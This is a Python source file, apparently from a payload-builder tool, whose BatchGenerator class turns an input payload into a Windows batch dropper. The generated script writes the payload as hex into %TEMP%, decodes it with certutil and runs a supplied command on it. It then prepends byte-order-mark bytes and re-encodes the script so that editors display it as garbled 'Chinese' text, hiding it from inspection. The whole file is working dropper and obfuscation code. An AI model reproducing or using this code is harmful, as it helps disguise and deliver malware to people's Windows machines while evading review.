from ..Generator import Generator

class BatchGenerator(Generator):
    def _run(self) -> str:
        self.print("🧸 Starting Batch generation")

        data = b"".join(bytes.fromhex(b) for b in ("FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"))

        script =  f"@echo off\n"
        script += f"cls\n"
        script +=  'set i=%TEMP%\\"{0}"\n'.format(self._filename.replace('"', '^"'))
        script += f"> %i% (\n"

        self.print("🔡 Dumping hex input")

        psHex = self._input.hex(' ')

        for i, ch in enumerate(psHex):
            if i % 90 == 0:
                # if i == 90:
                #     script += f"> %i%\n"
                # elif i > 0:
                #     script += f">> %i%\n"

                if i > 0:
                    script += "\n"

                script += "echo "

            script += ch

        script += "\n)\n"
        # script += f" >> %i%\n"

        script += f"certutil -f -decodehex %i% %i% >nul\n"
        script += self._command % r"%i%"

        self.print("🔺 Converting to chinese", paddingRight=1)

        script = script.encode('cp437', 'surrogatepass')
        data += b''.join(bytes.fromhex('%02X' % b) for b in script)

        return data
